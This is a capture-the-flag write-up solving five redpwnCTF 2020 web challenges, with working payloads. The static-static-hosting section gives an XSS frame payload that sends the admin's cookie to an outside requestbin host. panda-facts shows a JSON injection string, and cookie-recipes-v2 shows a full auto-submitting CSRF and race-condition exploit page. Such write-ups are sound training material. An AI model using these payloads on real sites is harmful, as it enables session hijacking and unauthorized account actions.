# pastebin  
> I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it [here](https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin)  
> Site: https://static-pastebin.2020.redpwnc.tf  
For this challenge I use a very nice [tool](https://xsshunter.com/) to solve it, the flag is the admin's cookie  
flag : `flag{54n1t1z4t10n_k1nd4_h4rd}`  

# panda-facts  
> I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down!  
> Site: panda-facts.2020.redpwnc.tf  
The concept is pretty much the same with any injection vulnerabilities, we can insert `name", "member" : 1, "x" : "somethingtomatchthequotationmarks` as our username, and it will inject a value of member and set it to 1, then x just to match the quotation marks.

flag : `flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}`

# static-static-hosting

> This is another xss challenge with a better filter so we have to craft a better payload basically

I struggle really hard on this one because the filter are just really strong, and i come up with a working `iframe` payload

But it didn't work, and when i asked the organizer it turns out that the admin site are using chrome to run the payload 

And with the fact that using `iframe` will create another child element thus creating a situation where we can't take the admin's cookie because of **chrome** (insert chrome jokes here)

so I came up with another solution

```html
<FRAMESET>
    <FRAME SRC="javascript:javascript:alert(document.cookie);">
</FRAMESET>
```

It turns out that we can use frame and run js inside of the `src`

```html
<FRAMESET>
    <FRAME SRC="javascript:javascript:(function() {
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open('POST', 'https://en8nxg3ahdy8p.x.pipedream.net', false );
        xmlHttp.send(btoa(document.cookie));
        return xmlHttp.responseText;   
    })();">
</FRAMESET>
```

So by creating payload like that, it will grab admin's cookie when the admin visit the site and send the cookie to our site in request bin and in this case the flag

flag = `flag{wh0_n33d5_d0mpur1fy}`

# anti-textbook

> This is the most interesting challenge from all web challenge i've come up so far in so many ctf's

We are only given this `n` and `e`

```
e: 65537
n: 23476345782117384360316464293694572348021858182972446102249052345232474617239084674995381439171455360619476964156250057548035539297034987528920054538760455425802275559282848838042795385223623239088627583122814519864252794995648742053597744613214146425693685364507684602090559028534555976544379804753832469034312177224373112610128420211922617372377101405991494199975508780694545263130816110474679504768973743009441005450839746644168233367636158687594826435608022717302508912914016439961300625816187681031915377565087756094989820015507950937541001438985964760705493680314579323085217869884649720526665543105616470022561
```

And i that it must be something related to an RSA crypto,   
looking at the hint : 
```
It's important for public keys to be transparent.

Hint: certificate-transparency.org
```

So thanks to @Wrth guess, we might be able to create a certificate from those 2 numbers

And i come up with this script to convert `e` and `n` to a `.pem` certificate

```python
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

exponent = 65537
modulus = 23476345782117384360316464293694572348021858182972446102249052345232474617239084674995381439171455360619476964156250057548035539297034987528920054538760455425802275559282848838042795385223623239088627583122814519864252794995648742053597744613214146425693685364507684602090559028534555976544379804753832469034312177224373112610128420211922617372377101405991494199975508780694545263130816110474679504768973743009441005450839746644168233367636158687594826435608022717302508912914016439961300625816187681031915377565087756094989820015507950937541001438985964760705493680314579323085217869884649720526665543105616470022561
numbers = RSAPublicNumbers(exponent, modulus)
public_key = numbers.public_key(backend=default_backend())
pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

print(pem)
```
And we got a `.pem` certificate :
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuffuWhYrpTW8cdcAWUwe
T8oZYCp/8pKPYj4eZ3pd7mhYoCkSSeqZ5e+L33O38SoMANogM1NBayYlumOcPxC/
C9PHMF6AlaLDH+yX/Fg+a055m0O7+5pJNUVuRn9z7aYhhubnRyjk2cVTHLmOHqK9
FPM1QBBdouddMgZYE6plaBdBIMwQ8txuZQs6t862zJfA0/cgT47TtiTNkouHkAuT
VXBPcbM5pXIu7MoflJrUjQ0ljuOIFgXQ7wCFusXrIpvuVpqLzRvTD69GA7Cj0Dt9
ij7KPrBFM2jFyR8vnm5w+T6sGafXgJEEj0sLmbIReWcNeyHC2Tl9OniyMEqPeLsZ
oQIDAQAB
-----END PUBLIC KEY-----
```

We can convert this certificate to sha256 hash and then search for related sha256 certificate in [https://censys.io/](https://censys.io/)

I use this openssl script to convert `.pem` to sha256 hash
```bash
openssl rsa -in pubkey.pem -pubin -outform der | openssl dgst -sha256
```

find the related site with that sha256 certificate this way  
https://censys.io/certificates?q=9db105389dd81cfb4b59ff1a4c0670c630b1800e542323111d5c5cb9af72031f

And we got a website that has the flag inside

flag = `flag{c3rTific4t3_7r4n5pArAncY_fTw} `

# cookie-recipes-v2

> I'm really proud that i can complete this challenge because its 'kinda' something new to me

So we are given a site with a persistent cookie (that also works as csrf) and the important thing is that every process will just rely on that static csrf cookie so it must be a csrf attack, but by reviewing the code

I see some interesting things happens when we want the admin to give a `gift` to our account, there is this TOC-TOU vulnerability leading us to racing condition attack

So in summary its a combination between csrf and race condition attack

The plan here are
```
1. Create a malicious site with very-finely(i tried hard so much on this) crafted exploit inside
2. Create a link to the site using awesome php+ngrok combo
3. Let the admin visit the site and do that csrf+race_condition attack for us
```

Here's my exploit code

```html
<html>
  <body>
    <!-- admin pass = n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn -->
    <!-- remote url = https://cookie-recipes-v2.2020.redpwnc.tf -->

    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>
    <form enctype="text/plain" action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091" method="POST">
      <input id="json" type="hidden" name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"' value='x"}' />
    </form>

    <div class='iframe_container'>
    <iframe name='formresponse1' width='350px' height='100px' frameborder='0'></iframe>
    </div>  
    <div class='iframe_container'>
    <iframe name='formresponse2' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse3' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse4' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse5' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse6' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse7' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse8' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse9' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse10' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse11' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse12' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse13' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse14' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse15' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse16' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse17' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse18' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse19' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse20' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse21' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse22' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse23' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse24' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    <div class='iframe_container'>
    <iframe name='formresponse25' width='350px' height='100px' frameborder='0'></iframe>
    </div>
    
    <script>
        for (let index = 0; index < 12; index++) {
          document.forms[index].target = ('formresponse' + (index+1))
        }
        for (let index = 0; index < 12; index++) {
          document.forms[index].submit();
        }
    </script>
  </body>
</html>
```
I know its a bad code, but who cares about "good" code when creating exploit :v

anyway here's the flag

flag = `flag{n0_m0r3_gu3551ng}`

For a record, after looking at other people's writeup I just surprised that I can use XMLHttpRequest instead of doing this stupid iframe things :(
